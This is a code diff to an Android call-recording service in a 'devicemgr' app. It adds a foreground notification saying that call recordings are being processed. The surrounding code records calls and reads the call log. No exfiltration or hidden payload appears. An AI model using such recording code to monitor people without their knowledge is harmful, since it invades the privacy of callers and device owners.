@@ -1,10 +1,14 @@
 package com.company.devicemgr.services;
 
 import android.app.Service;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.media.MediaRecorder;
+import android.os.Build;
 import android.os.IBinder;
 import android.provider.CallLog;
 import android.util.Log;
@@ -27,11 +31,18 @@ public class CallRecordingService extends Service {
     private static final String TAG = "CallRecordingSvc";
     private static final String PREFS = "devicemgr_prefs";
     private static final String KEY_QUEUE = "pending_call_recordings";
+    private static final String CHANNEL_ID = "devicemgr_call_recording";
 
     private MediaRecorder recorder;
     private File currentFile;
     private long currentRecordingStartedAtMs;
     private int currentAudioSource = -1;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        startAsForegroundService();
+    }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -221,6 +232,7 @@ public class CallRecordingService extends Service {
     @Override
     public void onDestroy() {
         stopRecording();
+        stopForeground(true);
         super.onDestroy();
     }
 
@@ -277,5 +289,37 @@ public class CallRecordingService extends Service {
         if (type == CallLog.Calls.BLOCKED_TYPE) return "Bloqueada";
         if (type == CallLog.Calls.VOICEMAIL_TYPE) return "Voicemail";
         return "Desconhecida";
+    }
+
+    private void startAsForegroundService() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+                if (nm != null) {
+                    NotificationChannel channel = new NotificationChannel(
+                            CHANNEL_ID,
+                            "DeviceMgr call recording",
+                            NotificationManager.IMPORTANCE_LOW
+                    );
+                    nm.createNotificationChannel(channel);
+                }
+                Notification notification = new Notification.Builder(this, CHANNEL_ID)
+                        .setContentTitle("DeviceMgr")
+                        .setContentText("A processar gravações de chamada")
+                        .setSmallIcon(android.R.drawable.ic_btn_speak_now)
+                        .build();
+                startForeground(2, notification);
+                return;
+            }
+
+            Notification notification = new Notification.Builder(this)
+                    .setContentTitle("DeviceMgr")
+                    .setContentText("A processar gravações de chamada")
+                    .setSmallIcon(android.R.drawable.ic_btn_speak_now)
+                    .build();
+            startForeground(2, notification);
+        } catch (Exception e) {
+            Log.w(TAG, "startAsForegroundService failed", e);
+        }
     }
 }
